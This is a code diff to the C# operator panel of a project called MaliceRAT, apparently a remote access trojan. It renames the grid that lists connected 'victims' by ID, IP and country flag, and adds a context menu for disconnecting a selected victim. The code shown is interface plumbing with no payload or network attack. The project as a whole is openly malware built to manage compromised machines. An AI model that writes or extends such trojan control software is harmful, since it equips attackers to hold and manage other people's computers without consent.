@@ -6,7 +6,6 @@ using System.Reflection;
 using Microsoft.CSharp;
 using System.Threading.Tasks;
 using System.Drawing;
-using System.Drawing.Imaging;
 using MaliceRAT.RatServer;
 
 namespace MaliceRAT
@@ -18,6 +17,7 @@ namespace MaliceRAT
         public Main()
         {
             InitializeComponent();
+            InitializeContextMenu();
 
             server.StartServer();
             server.InfoReceived += Server_InfoReceived;
@@ -132,14 +132,15 @@ namespace MaliceRAT
                 }
             }
         }
+        // Victims table
         private async Task AddVictimToGrid(Victim victim) {
             if (InvokeRequired) {
                 Invoke(new Action(async () => await AddVictimToGrid(victim)));
                 return;
             }
 
-            int rowIndex = guna2DataGridView1.Rows.Add();
-            DataGridViewRow row = guna2DataGridView1.Rows[rowIndex];
+            int rowIndex = gunaVictimsTable.Rows.Add();
+            DataGridViewRow row = gunaVictimsTable.Rows[rowIndex];
 
             row.Cells["ID"].Value = victim.Id;
             row.Cells["IP"].Value = victim.IP;
@@ -152,15 +153,15 @@ namespace MaliceRAT
 
             row.Cells["Flag"].Value = flagImage;
 
-            for (int i = 0; i < guna2DataGridView1.Columns.Count; i++) {
+            for (int i = 0; i < gunaVictimsTable.Columns.Count; i++) {
                 if(row.Cells[i].Value == null) {
                     row.Cells[i].Value = "N/A";
                 }
             }
         }
         public void RemoveVictimFromGrid(Victim victim) {
-            if (guna2DataGridView1.InvokeRequired) {
-                guna2DataGridView1.Invoke(new Action(() => {
+            if (gunaVictimsTable.InvokeRequired) {
+                gunaVictimsTable.Invoke(new Action(() => {
                     RemoveVictimById(victim.Id);
                 }));
             } else {
@@ -168,13 +169,14 @@ namespace MaliceRAT
             }
         }
         private void RemoveVictimById(int id) {
-            foreach (DataGridViewRow row in guna2DataGridView1.Rows) {
+            foreach (DataGridViewRow row in gunaVictimsTable.Rows) {
                 if (row.Cells["ID"].Value != null && (int)row.Cells["ID"].Value == id) {
-                    guna2DataGridView1.Rows.Remove(row);
+                    gunaVictimsTable.Rows.Remove(row);
                     break;
                 }
             }
         }
+        // Server events
         private async void Server_InfoReceived(Victim client) 
         {
             await AddVictimToGrid(client);
@@ -182,6 +184,42 @@ namespace MaliceRAT
         private void Server_ClientDisconnected(Victim client) 
         {
             RemoveVictimFromGrid(client);
+        }
+        // Context Menu
+        private void InitializeContextMenu()
+        {
+            ContextMenuStrip victimContextMenu = new ContextMenuStrip();
+
+            ToolStripMenuItem Item1 = ContextMenuUtilities.CreateContextMenuItem("Disconnect", (sender, e) => Item1_Click(sender, e, gunaVictimsTable));
+            
+            victimContextMenu.Items.Add(Item1);
+
+            gunaVictimsTable.ContextMenuStrip = victimContextMenu;
+            gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaVictimsTable_MouseDown(sender, e, gunaVictimsTable);
+        }
+        private int? GetSelectedId(DataGridView gunaVictimsTable)
+        {
+            if (gunaVictimsTable.SelectedRows.Count > 0)
+            {
+                int selectedRowIndex = gunaVictimsTable.SelectedRows[0].Index;
+                if (selectedRowIndex != -1)
+                {
+                    var idCell = gunaVictimsTable.Rows[selectedRowIndex].Cells["ID"];
+                    if (idCell != null && idCell.Value != null)
+                    {
+                        return (int)idCell.Value;
+                    }
+                }
+            }
+            return null;
+        }
+        private void Item1_Click(object sender, EventArgs e, DataGridView gunaVictimsTable)
+        {
+            var id = GetSelectedId(gunaVictimsTable);
+            if (id.HasValue)
+            {
+                server.DisconnectClient(id.Value);
+            }
         }
     }
 }
